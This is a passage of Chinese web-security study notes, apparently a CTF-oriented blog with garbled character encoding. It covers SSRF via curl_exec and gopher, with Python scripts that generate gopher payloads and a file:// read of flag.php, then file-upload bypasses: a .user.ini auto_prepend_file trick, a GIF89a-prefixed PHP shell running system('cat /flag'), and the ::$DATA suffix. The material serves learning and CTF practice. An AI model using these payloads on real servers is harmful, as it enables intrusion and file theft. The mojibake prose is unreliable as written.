title="curl_exec()"></a>curl_exec()</h5><blockquote><p>é€šè¿‡<code>curl_exec()</code>å‡½æ•°æ‰§è¡Œurlä¼ è¿‡æ¥å‚æ•°ç»™çš„åœ°å€ï¼Œç„¶åå°†å‚æ•°è¿”å›å‰ç«¯ã€‚å¦‚æœurlå‚æ•°è¢«æ›¿æ¢æˆ<a href="http://xxxxæˆ–è€…curlæ”¯æŒçš„å…¶ä»–åè®®ç­‰éƒ½ä¼šè¢«curlæ‰§è¡Œ(curlæ”¯æŒ`telnet/">http://xxxxæˆ–è€…curlæ”¯æŒçš„å…¶ä»–åè®®ç­‰éƒ½ä¼šè¢«curlæ‰§è¡Œï¼ˆcurlæ”¯æŒ`telnet</a> ftp ftps dict file ldap&#96;ç­‰ï¼‰</p></blockquote><h3 id="gopheråè®®æ€»ç»“"><a href="#gopheråè®®æ€»ç»“" class="headerlink" title="gopheråè®®æ€»ç»“"></a>gopheråè®®æ€»ç»“</h3><blockquote><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667791">åŸæ–‡</a></p><p><a href="https://blog.csdn.net/qq_60115503/article/details/124407499">å¦ä¸€ç¯‡æ¨èçš„æ–‡ç« </a></p></blockquote><blockquote><p>gopheråè®®</p><p>æ˜¯ä¸€ç§ä¿¡æ¯æŸ¥0æ‰¾ç³»ç»Ÿï¼Œä»–å°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œæ–¹ä¾¿ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ã€‚åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ Redisã€Mysqlã€FastCGIã€Ftpç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ GETã€POST è¯·æ±‚ã€‚è¿™æ‹“å®½äº† SSRF çš„æ”»å‡»é¢</p></blockquote><h4 id="1-åˆ©ç”¨ï¼š"><a href="#1-åˆ©ç”¨ï¼š" class="headerlink" title="1)åˆ©ç”¨ï¼š"></a>1)åˆ©ç”¨ï¼š</h4><blockquote><p>æ”»å‡»å†…ç½‘çš„ <code>Redisã€Mysqlã€FastCGIã€Ftp</code>ç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ <code>GETã€POST</code> è¯·æ±‚</p></blockquote><p>gopheråè®®çš„æ ¼å¼ï¼š</p><blockquote><p><code>gopher://IP:port/_TCP/IPæ•°æ®æµ</code>  </p><p>æ¯”å¦‚ï¼Œ</p><p><code>gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</code></p></blockquote><blockquote><p>æœ‰æ—¶å€™è¯»å–æ–‡ä»¶éœ€è¦ä»ç½‘ç«™<code>æœ¬èº«çš„127.0.0.1å‘å‡ºè¯·æ±‚</code></p><p>å¯ä»¥åˆ©ç”¨<code>file://</code>ä¼ªåè®®ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶</p><p>æ¯”å¦‚<br><code>?url=file:///var/www/html/flag.php</code></p></blockquote><h4 id="2-GTEè¯·æ±‚"><a href="#2-GTEè¯·æ±‚" class="headerlink" title="2)GTEè¯·æ±‚"></a>2)GTEè¯·æ±‚</h4><blockquote><p>æ„é€ HTTPæ•°æ®åŒ…</p><p>URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0aï¼ŒHTTPåŒ…æœ€ååŠ %0d%0aä»£è¡¨æ¶ˆæ¯ç»“æŸ</p><p>å‘é€gopheråè®®, åè®®åçš„IPä¸€å®šè¦æ¥ç«¯å£</p></blockquote><h4 id="3-POSTè¯·æ±‚"><a href="#3-POSTè¯·æ±‚" class="headerlink" title="3)POSTè¯·æ±‚"></a>3)POSTè¯·æ±‚</h4><blockquote><p>POSTä¸GETä¼ å‚çš„åŒºåˆ«ï¼šå®ƒæœ‰4ä¸ªå‚æ•°ä¸ºå¿…è¦å‚æ•°</p><p>éœ€è¦ä¼ é€’<br>Content-Type,<br>Content-Length,<br>host,<br>postçš„å‚æ•°</p><p>æ¯”å¦‚ï¼š</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /flag.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1:80</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">36</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">key</span>=<span class="number">51457</span>bb0a50c1eb2c92dcc3ec3c2cc13        //postå‚æ•°</span><br></pre></td></tr></table></figure><blockquote><p><code>Host</code>ã€<code>Content-Type</code>å’Œ<code>Content-Length</code>è¯·æ±‚å¤´æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œä½†åœ¨ GETè¯·æ±‚ä¸­å¯ä»¥æ²¡æœ‰<br><code>åˆ‡è®°ï¼šContent-Length è¿™ä¸ªè¦å’Œåº•ä¸‹POSTå‚æ•°[æ¯”å¦‚ä¾‹å­ä¸­key=,4ä¸ª+51457bb0a50c1eb2c92dcc3ec3c2cc13,32ä¸ªï¼Œå…±è®¡36ä¸ª]é•¿åº¦ä¸€è‡´</code></p></blockquote><p>pythonè„šæœ¬ç”Ÿæˆpayloadï¼ˆPOSTå’ŒGTEè¯·æ±‚éƒ½é€‚ç”¨ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=a68a3b03e80ce7fef96007dfa01dc077</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload) <span class="comment">#å¯¹payloadä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç </span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>) <span class="comment">#CRLFLæ¼æ´</span></span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)<span class="comment"># å¯¹æ–°å¢çš„éƒ¨åˆ†ç»§ç»­ç¼–ç </span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h5 id="æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚"><a href="#æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚" class="headerlink" title="æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚"></a>æ„é€ ä¸€ä¸ªæäº¤æ–‡ä»¶çš„POSTè¯·æ±‚</h5><p>é¦–å…ˆæŠ“å–ä¸€ä¸ªæ­£å¸¸æäº¤æ–‡ä»¶çš„æ•°æ®åŒ…ï¼Œç„¶åä½¿ç”¨ä¸Šè¿°è„šæœ¬å°†å…¶è½¬æ¢ä¸ºgopheråè®®çš„æ ¼å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="gopheræ‰“FastCGI"><a href="#gopheræ‰“FastCGI" class="headerlink" title="gopheræ‰“FastCGI"></a>gopheræ‰“FastCGI</h4><blockquote><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121643002">çœ‹æˆ‘è¿™ä¸€ç¯‡</a></p></blockquote><h4 id="gopheræ‰“redis"><a href="#gopheræ‰“redis" class="headerlink" title="gopheræ‰“redis"></a>gopheræ‰“redis</h4><blockquote><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667613">çœ‹æˆ‘è¿™ä¸€ç¯‡</a></p></blockquote><h4 id="gopheræ‰“mysql"><a href="#gopheræ‰“mysql" class="headerlink" title="gopheræ‰“mysql"></a>gopheræ‰“mysql</h4><p><code>gopher</code>æ‰“<code>mysql</code>ï¼Œå°±æ˜¯åˆ©ç”¨<code>gopher</code>åè®®ä¼ <code>shell</code>åˆ°<code>mysql</code>ä¸­ã€‚</p><p>é¦–å…ˆMysqlå­˜åœ¨ä¸‰ç§è¿æ¥æ–¹å¼</p><blockquote><p>Unixå¥—æ¥å­—ï¼›<br>å†…å­˜å…±äº«&#x2F;å‘½åç®¡é“ï¼›<br>TCP&#x2F;IPå¥—æ¥å­—ï¼›</p></blockquote><p><code>MySQL</code>å®¢æˆ·ç«¯è¿æ¥å¹¶ç™»å½•æœåŠ¡å™¨æ—¶å­˜åœ¨ä¸¤ç§æƒ…å†µï¼šéœ€è¦å¯†ç è®¤è¯ä»¥åŠæ— éœ€å¯†ç è®¤è¯ã€‚</p><blockquote><p>å½“éœ€è¦å¯†ç è®¤è¯æ—¶ä½¿ç”¨æŒ‘æˆ˜åº”ç­”æ¨¡å¼ï¼ŒæœåŠ¡å™¨å…ˆå‘é€saltç„¶åå®¢æˆ·ç«¯ä½¿ç”¨saltåŠ å¯†å¯†ç ç„¶åéªŒè¯<br>å½“æ— éœ€å¯†ç è®¤è¯æ—¶ç›´æ¥å‘é€TCP&#x2F;IPæ•°æ®åŒ…å³å¯</p></blockquote><p>è¿™å„¿å¯¹<code>localhost</code>å’Œ127.0.0.1åšä¸€ä¸ªåŒºåˆ«</p><blockquote><p><code>localhost</code>ä¹Ÿå«local ï¼Œæ­£ç¡®çš„è§£é‡Šæ˜¯ï¼š<code>æœ¬åœ°æœåŠ¡å™¨ã€‚</code><br><code>127.0.0.1</code>çš„æ­£ç¡®è§£é‡Šæ˜¯ï¼š<code>æœ¬æœºåœ°å€ï¼ˆæœ¬æœºæœåŠ¡å™¨ï¼‰</code>ï¼Œå®ƒçš„è§£æé€šè¿‡æœ¬æœºçš„hostæ–‡ä»¶ï¼Œ<code>windowsè‡ªåŠ¨å°†localhostè§£æä¸º127.0.0.</code>1ã€‚</p><p><code>localhostï¼ˆlocalï¼‰</code>æ˜¯<code>ä¸ç»ç½‘å¡ä¼ è¾“çš„ï¼Œè¿™ç‚¹å¾ˆé‡è¦ï¼Œå®ƒä¸å—ç½‘ç»œé˜²ç«å¢™å’Œç½‘å¡ç›¸å…³çš„çš„é™åˆ¶</code>ã€‚</p><p><code>127.0.0.1</code>æ˜¯é€šè¿‡<code>ç½‘å¡ä¼ è¾“ï¼Œä¾èµ–ç½‘å¡ï¼Œå¹¶å—åˆ°ç½‘ç»œé˜²ç«å¢™å’Œç½‘å¡ç›¸å…³çš„é™åˆ¶</code></p><p>ç®€å•è¯´<br>å½“æˆ‘ä»¬é€šè¿‡<code>mysql -hlocalhost -uname</code>å»è¿æ¥çš„æ—¶å€™ï¼Œ**<code>æ²¡æœ‰ç»è¿‡ç½‘å¡</code>**ï¼Œä½¿ç”¨çš„æ˜¯<code>unix</code>å¥—æ¥å­—è¿æ¥ï¼Œè¿™ç§æ—¶å€™æˆ‘ä»¬<code>tcpdump</code>æ˜¯æŠ“ä¸åˆ°åŒ…çš„<br>å½“æˆ‘ä»¬éœ€è¦æŠ“å–<code>mysql</code>é€šä¿¡æ•°æ®åŒ…æ—¶<code>å¿…é¡»ä½¿ç”¨TCP/IP</code>å¥—æ¥å­—è¿æ¥ã€‚<br><code>mysql -h 127.0.0.1 -uname</code></p></blockquote><p>æˆ‘ä»¬å¹³å¸¸æ‰“<code>mysql</code>æœ€å¸¸ç”¨çš„å°±æ˜¯æ‰“<strong>æ— å¯†ç </strong>çš„<code>mysql</code></p><p>ä½†æ˜¯æˆ‘ä»¬åœ¨ç”¨<code>gopher</code>è¿˜æ˜¯éœ€è¦ç”¨<code>dict</code>åè®®å»å¾—åˆ°<code>mysql</code>çš„ç«¯å£(é»˜è®¤æ˜¯**<code>3306</code>**)</p><p>ç›´æ¥ä½¿ç”¨çš„<code>gopherus</code>å·¥å…·,ç›´æ¥å¿«é€Ÿç”Ÿæˆ<code>payload</code></p><p><img src="/2022/05/28/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></p><h1 id="æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆäºŒï¼‰"><a href="#æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆäºŒï¼‰" class="headerlink" title="æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆäºŒï¼‰"></a>æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆäºŒï¼‰</h1><h2 id="å…­ã€fileupload"><a href="#å…­ã€fileupload" class="headerlink" title="å…­ã€fileupload"></a>å…­ã€fileupload</h2><h3 id="1-å¤šé‡è¿‡æ»¤ç»•è¿‡"><a href="#1-å¤šé‡è¿‡æ»¤ç»•è¿‡" class="headerlink" title="1.å¤šé‡è¿‡æ»¤ç»•è¿‡"></a>1.å¤šé‡è¿‡æ»¤ç»•è¿‡</h3><p><u><strong>ä¸‹é¢æ˜¯ä»¥æ”»é˜²ä¸–ç•Œçš„ä¸€é“easyuploadçš„wpè®²è§£ä¸€äº›æƒ…å½¢çš„ç»•è¿‡æ–¹å¼</strong></u></p><p>è¿™é‡Œéœ€è¦ç»•è¿‡çš„ç‚¹å¦‚ä¸‹</p><blockquote><ul><li>æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰<code>php</code>å­—ç¬¦ä¸²</li><li>æ£€æŸ¥åç¼€ä¸­æ˜¯å¦æœ‰<code>htaccess</code>æˆ–<code>php</code></li><li>æ£€æŸ¥æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯</li><li>æ–‡ä»¶<code>MIME</code>ç±»å‹</li></ul></blockquote><h4 id="çŸ­æ ‡ç­¾"><a href="#çŸ­æ ‡ç­¾" class="headerlink" title="çŸ­æ ‡ç­¾"></a>çŸ­æ ‡ç­¾</h4><p>å¯¹äº<u>ç¬¬ä¸€ç‚¹</u>å¯ä»¥åˆ©ç”¨<strong>çŸ­æ ‡ç­¾</strong>ç»•è¿‡ï¼Œä¾‹å¦‚ <code>&lt;?=phpinfo();?&gt;</code></p><blockquote><p>æŠŠ<code>short_open_tag</code>å­—æ®µæ”¹ä¸º<code>On</code>ï¼Œå°±å¯ä»¥å®ç°çŸ­æ ‡ç­¾åŠŸèƒ½</p><p>çŸ­æ ‡ç­¾ï¼š<br>1.èƒ½æ­£å¸¸è§£æç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š <code>phpinfo() ?&gt;</code>  </p><p>2.ä½¿ç”¨<code>&lt;?=$a?&gt;</code>çš„å½¢å¼è¾“å‡ºï¼Œåœ¨çŸ­æ ‡ç­¾çœ‹æ¥ï¼Œ<code>&lt;?=$a?&gt;</code></p><p>3.<code>&lt;?=(è¡¨è¾¾å¼)?&gt;</code><br>å°±ç›¸å½“äº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><blockquote><p>æ­£ç¡®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŠ¥é”™ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»è¿™ä¸ªå¯¹æ¯”è¯•éªŒæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼š<br>åœ¨çŸ­æ ‡ç­¾æ¨¡å¼ä¸‹ï¼Œ<br>æˆ‘ä»¬æ‰§è¡Œphpè¯­å¥phpå‡½æ•°ï¼Œéƒ½ç”¨ç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">phpinfo</span>();?&gt;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬è¦è¾“å‡ºä¸€ä¸ªflagï¼Œæˆ–è€…å˜é‡æ—¶ï¼Œä½¿ç”¨<code>&lt;?=$a?&gt;</code>çš„å½¢å¼è¾“å‡º</p></blockquote><h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>å¯¹äº<u>ç¬¬äºŒç‚¹</u>å¯ä»¥é€šè¿‡ä¸Šä¼ <code>.user.ini</code>ä»¥åŠæ­£å¸¸<code>jpg</code>æ–‡ä»¶æ¥è¿›è¡Œ<code>getshell</code>,å¯ä»¥å‚è€ƒä»¥ä¸‹æ–‡ç« </p><blockquote><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">æ–‡ç« </a></p></blockquote><p><strong>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</strong></p><p> <strong>è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</strong></p><p> <strong>å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">user</span>.iniå†…å®¹</span><br><span class="line"></span><br><span class="line">auto_prepend_file=<span class="number">5</span>.jpg</span><br><span class="line"></span><br><span class="line">è¿™æ ·.<span class="keyword">user</span>.iniå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä¼šè‡ªåŠ¨åŒ…å«å›¾ç‰‡ğŸï¼Œä»è€Œè®©æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p><u>ç¬¬ä¸‰ç‚¹</u>ç»•è¿‡æ–¹å¼å³åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ªå›¾ç‰‡çš„<strong>æ–‡ä»¶å¤´</strong>ï¼Œæ¯”å¦‚<code>GIF89a</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">JPG</span> ï¼šFF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF</span>(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PNG</span>ï¼š <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span></span><br></pre></td></tr></table></figure><p><u>ç¬¬å››ç‚¹</u>ç»•è¿‡æ–¹æ³•å³ä¿®æ”¹ä¸Šä¼ æ—¶çš„<code>Content-Type</code></p><p>å› æ­¤æœ€ç»ˆçš„<code>payload</code>ä¸ºï¼š<br> ä¸Šä¼ <code>.user.ini</code>ï¼Œå†…å®¹ä¸º</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_fileã€<span class="built_in">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class="built_in">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ a.jpgï¼Œå†…å®¹ä¸º</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-æ–‡ä»¶ç±»å‹"><a href="#2-æ–‡ä»¶ç±»å‹" class="headerlink" title="2.æ–‡ä»¶ç±»å‹"></a>2.æ–‡ä»¶ç±»å‹</h3><p><img src="https://img-blog.csdnimg.cn/20200226180218842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFqaWF3ZWk=,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="3-å…¶ä»–ç»•è¿‡"><a href="#3-å…¶ä»–ç»•è¿‡" class="headerlink" title="3.å…¶ä»–ç»•è¿‡"></a>3.å…¶ä»–ç»•è¿‡</h3><h4 id="1ï¼‰-DATAç»•è¿‡"><a href="#1ï¼‰-DATAç»•è¿‡" class="headerlink" title="1ï¼‰::$DATAç»•è¿‡"></a>1ï¼‰::$DATAç»•è¿‡</h4><blockquote><p>â— ç»•è¿‡â½…æ³•ï¼š</p><p>â—‹ é€šè¿‡æŠ“å–ä¸Šä¼ æ•°æ®åŒ…ï¼Œä¿®æ”¹ä¸Šä¼ çš„â½‚ä»¶åç¼€ï¼Œå®ç°ä¸Šä¼ ã€‚</p><p>ç»•è¿‡åŸç†ï¼š</p><p>â— ä¸ä¸Šâ¾¯é¢˜ç›¸â½å‘¢è¿™ä¸ªé“é¢˜å»æ‰äº†ï¼š$file_ext &#x3D; str_ireplace(â€˜::$DATAâ€™, â€˜â€™, $file_ext);&#x2F;&#x2F;å»é™¤å­—ç¬¦</p><p>ä¸²::$DATA è¿™â¾ä»£ç ã€‚</p><p>â— ::$DATA æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå¿…é¡»æ˜¯windows, å¿…é¡»æ˜¯php, å¿…é¡»æ˜¯é‚£ä¸ªæºâ½‚ä»¶ï¼Œphpåœ¨windowçš„æ—¶å€™å¦‚</p><p>æœâ½‚ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆâ½‚ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”æŒâ€::$DATAâ€ä¹‹å‰</p><p>çš„â½‚ä»¶å</p><p>â— ä»–çš„â½¬çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å</p></blockquote><h4 